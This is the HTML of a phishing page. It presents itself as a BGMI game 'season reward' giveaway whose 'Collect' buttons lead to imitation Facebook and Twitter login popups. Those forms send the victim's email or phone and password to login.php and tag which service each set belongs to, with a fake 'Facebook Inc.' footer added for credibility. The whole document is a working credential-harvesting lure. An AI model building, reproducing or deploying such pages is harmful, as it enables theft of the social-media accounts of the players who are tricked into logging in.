<div class="menu-notify-txt">Hi survivor, this is the season reward for you today</div>
</div> 
<div class="scroll">
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102176906-3cea5880-3e57-11eb-8fa8-6fa393c70a2f.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102176906-3cea5880-3e57-11eb-8fa8-6fa393c70a2f.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102176907-3d82ef00-3e57-11eb-9694-f8a46e9e6993.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102176907-3d82ef00-3e57-11eb-9694-f8a46e9e6993.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102176908-3e1b8580-3e57-11eb-9807-aa69a3091434.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102176908-3e1b8580-3e57-11eb-9807-aa69a3091434.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102176909-3eb41c00-3e57-11eb-87f9-acf71898d00d.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102176909-3eb41c00-3e57-11eb-87f9-acf71898d00d.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102176910-3f4cb280-3e57-11eb-83e7-f8407dded1db.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102176910-3f4cb280-3e57-11eb-83e7-f8407dded1db.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102176873-31972d00-3e57-11eb-86d0-ade0e6fbf2cd.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102176873-31972d00-3e57-11eb-86d0-ade0e6fbf2cd.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102176874-3360f080-3e57-11eb-9ef9-55ab8f2be1ae.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102176874-3360f080-3e57-11eb-9ef9-55ab8f2be1ae.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102176877-33f98700-3e57-11eb-95c9-2cb536a85337.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102176877-33f98700-3e57-11eb-95c9-2cb536a85337.png">Collect</button>
</div>
</div> 
</div> 
<div class="tab_rewards" id="other">
<script type="text/javascript">
function buka(nama) {
$("#konten").html('<div class="load-item">Please wait...</div>');
	$.ajax({
		url	: nama+'.php',
		type	: 'GET',
		dataType: 'html',
		success	: function(isi){
			$("#konten").html(isi);
		},
	});
}
</script>
<div id="konten">
<div class="menu-notify">
<a href="javascript:;" onclick="buka('pages/uc');"><div class="menu-notify-change">Change Reward</div></a>
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Hi survivor, this is the other reward for you</div>
</div> 
<div class="scroll">
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102177638-ce0dff00-3e58-11eb-9fed-15142caabde8.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177638-ce0dff00-3e58-11eb-9fed-15142caabde8.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102177733-f990e980-3e58-11eb-861d-328f46e0e99a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177733-f990e980-3e58-11eb-861d-328f46e0e99a.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102177768-0ad9f600-3e59-11eb-9adb-98445bfe1719.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177768-0ad9f600-3e59-11eb-9adb-98445bfe1719.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102177786-14fbf480-3e59-11eb-99d3-de9065c81956.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177786-14fbf480-3e59-11eb-99d3-de9065c81956.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102177815-22b17a00-3e59-11eb-84d4-e90dd1b6d3e0.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177815-22b17a00-3e59-11eb-84d4-e90dd1b6d3e0.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102177831-2a711e80-3e59-11eb-8e90-38ee445d1e9c.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177831-2a711e80-3e59-11eb-8e90-38ee445d1e9c.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102177850-34931d00-3e59-11eb-820e-8f542dfe384a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177850-34931d00-3e59-11eb-820e-8f542dfe384a.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102177886-47a5ed00-3e59-11eb-95d6-df7a58e91408.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177886-47a5ed00-3e59-11eb-95d6-df7a58e91408.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102177901-4f659180-3e59-11eb-9a58-b3479f17e38b.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177901-4f659180-3e59-11eb-9a58-b3479f17e38b.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102177933-5b515380-3e59-11eb-8bda-4f1f2a4e14b0.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177933-5b515380-3e59-11eb-8bda-4f1f2a4e14b0.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102177951-660be880-3e59-11eb-99a8-c5e64a2a05ac.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177951-660be880-3e59-11eb-99a8-c5e64a2a05ac.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102177971-702de700-3e59-11eb-94da-1e030cfc930d.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177971-702de700-3e59-11eb-94da-1e030cfc930d.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102177988-7754f500-3e59-11eb-9cd8-2f9f650ae93a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102177988-7754f500-3e59-11eb-9cd8-2f9f650ae93a.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102178004-8045c680-3e59-11eb-92d7-25a0b9ebf4b1.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178004-8045c680-3e59-11eb-92d7-25a0b9ebf4b1.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102178044-905da600-3e59-11eb-8964-38c5f4a8cb30.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178044-905da600-3e59-11eb-8964-38c5f4a8cb30.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102178073-9ce1fe80-3e59-11eb-9781-db40b88ac6b2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178073-9ce1fe80-3e59-11eb-9781-db40b88ac6b2.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102178087-a66b6680-3e59-11eb-9029-1cb54c9b349c.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178087-a66b6680-3e59-11eb-9029-1cb54c9b349c.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102178108-b1be9200-3e59-11eb-80ec-de48331ecd4b.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178108-b1be9200-3e59-11eb-80ec-de48331ecd4b.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102178132-bf741780-3e59-11eb-9863-6edd13adac8c.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178132-bf741780-3e59-11eb-9863-6edd13adac8c.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102178151-c864e900-3e59-11eb-87b7-29544ecda0d1.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178151-c864e900-3e59-11eb-87b7-29544ecda0d1.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102178179-d61a6e80-3e59-11eb-9582-a175103ee31b.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178179-d61a6e80-3e59-11eb-9582-a175103ee31b.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102178205-e03c6d00-3e59-11eb-9fc3-88fef34d6dd3.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178205-e03c6d00-3e59-11eb-9fc3-88fef34d6dd3.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102178258-f813f100-3e59-11eb-8b60-8ab88eec349a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178258-f813f100-3e59-11eb-8b60-8ab88eec349a.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102178300-0a8e2a80-3e5a-11eb-9638-0e0821e2f3df.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178300-0a8e2a80-3e5a-11eb-9638-0e0821e2f3df.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102178317-14179280-3e5a-11eb-8009-46a39bccf8fa.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178317-14179280-3e5a-11eb-8009-46a39bccf8fa.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102178346-1ed22780-3e5a-11eb-949b-b242d6629bcd.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178346-1ed22780-3e5a-11eb-949b-b242d6629bcd.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102178381-2abde980-3e5a-11eb-8add-848994af710e.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178381-2abde980-3e5a-11eb-8add-848994af710e.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102178421-38736f00-3e5a-11eb-96a3-998f273c2da4.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178421-38736f00-3e5a-11eb-96a3-998f273c2da4.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102178437-40cbaa00-3e5a-11eb-9ed8-345bfa52aac0.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178437-40cbaa00-3e5a-11eb-9ed8-345bfa52aac0.png">Collect</button>
</div>
</div> 
<script src="js/popup.js"></script></div>
</div> 
</div> 
</div> 
</div> 
<div class="popup reward_confirmation" style="display: none;">
<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> 
<div class="navbar-logo-box">
<img src="https://github.com/LUCIFERGREYHAT1/maxfiles/assets/85693629/01e02a41-e408-477b-bee4-fc7d2e7cb7a0">
</div> 
</div> 
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-help-outline"></i></div>
<div class="menu-notify-txt">Hi survivor, are you sure to collect this reward?</div>
</div> 
<div class="item-confirmation">
<div class="item-confirmation-img-box">
<img src="" id="myReward">
</div> 
<div class="item-confirmation-info">
<div class="item-confirmation-status-title">
Reward Availability
</div> 
<div class="item-confirmation-status-info">
This reward is available to collect
</div> 
<div class="item-confirmation-information-title">
Reward Information
</div> 
<div class="item-confirmation-information-info">
Special reward for Royale Pass Season 15.
</div> 
</div> 
</div> 
<div class="btn-popup-wrapper">
<div class="btn-popup kiri" onclick="close_reward_confirmation()">
<div class="btn-popup-icon"><i class="fa fa-chevron-left fa-md"></i></div>
<div class="btn-popup-txt">Back to reward</div>
</div> 
<div class="btn-popup kanan" onclick="open_account_login()">
<div class="btn-popup-icon" style="margin-right: 0px; float: right;"><i class="fa fa-chevron-right fa-md" style="margin-left: 3px;"></i></div>
<div class="btn-popup-txt">Collect this reward</div>
</div> 
</div> 
</div> 
</div> 
</div> 
</div> 
<div class="popup account_login" style="display: none;">
<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> 
<div class="navbar-logo-box">
<img src="https://user-images.githubusercontent.com/49580304/102181053-bfc2e180-3e5e-11eb-971c-7497af54c15d.png">
</div> 
</div> 
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Login to your BGMI account to receive your reward</div>
</div> 
<div class="btn-login" onclick="open_facebook_login()">
<div class="btn-login-logo">
<img src="https://user-images.githubusercontent.com/49580304/102179431-fa774a80-3e5b-11eb-9aa3-169f4b9a2f03.png">
</div>
<div class="btn-login-txt">Login with Facebook</div>
</div> 
<div class="btn-login" onclick="open_twitter_login()">
<div class="btn-login-logo">
<img src="https://user-images.githubusercontent.com/49580304/102179484-167aec00-3e5c-11eb-9987-ea89880403f5.png">
</div>
<div class="btn-login-txt">Login with Twitter</div>
</div> 
<div class="btn-popup-wrapper">
<div class="btn-popup tengah" onclick="close_account_login()">
<div class="btn-popup-icon"><i class="fa fa-chevron-left fa-md"></i></div>
<div class="btn-popup-txt">Back to reward</div>
</div> 
</div> 
</div> 
</div> 
</div> 
</div> 
<div class="popup-login login_facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="close_facebook_login()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="https://user-images.githubusercontent.com/49580304/102181121-dcf7b000-3e5e-11eb-8549-72cb41a2b68a.png">
</div>
<div class="content-box-fb">
<img src="https://github.com/LUCIFERGREYHAT1/maxfiles/assets/85693629/23f07150-8984-4cc5-b38b-64743717aa21">
<div class="txt-login-fb">
Log in to your Facebook account to connect to BGMI
</div>
<form action="login.php" method="post">
<input type="text" class="input-fb-email" name="email" placeholder="Mobile number or email" autocomplete="off" autocapitalize="off" required>
<input type="password" class="input-fb-password" name="pass" placeholder="Facebook password" autocomplete="off" autocapitalize="off" required>
<input type="hidden" name="login" value="Facebook" readonly>
<button type="submit" class="btn-login-fb">Log In</button>
</form>
<div class="txt-create-account">Create account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">Bahasa Indonesia</div>
<div class="language-name">Basa Jawa</div>
<div class="language-name">Bahasa Melayu</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">Português (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Facebook Inc.</div>
</div>
</div>
<div class="popup-login login_twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="close_twitter_login()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter">
<center>
<img src="https://user-images.githubusercontent.com/49580304/102179592-44f8c700-3e5c-11eb-9756-e98e6f4c582c.png">
</center>
</div>
<div class="box-twitter">
<center>
<form action="login.php" method="post">
<div class="txt-login-twitter">Login to Twitter</div>
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="text" name="email" placeholder="" required>
</div>
<div class="input-box-twitter">
<label>Password</label>
<input type="password" name="pass" placeholder="" required>
</div>
<input type="hidden" name="login" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div>rk
<div class="footer-menu-twitter bulet">•</div>
<div class="footer-menu-twitter">Sign up to Twitter</div>
</form>
</center>
</div>
</div>
</div>
<script type="text/javascript" src="jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="ajax/libs/jquery/2-1-1/jquery.min.js"></script>
<script src="ajax/libs/jquery/2-1-3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
</body>
</html>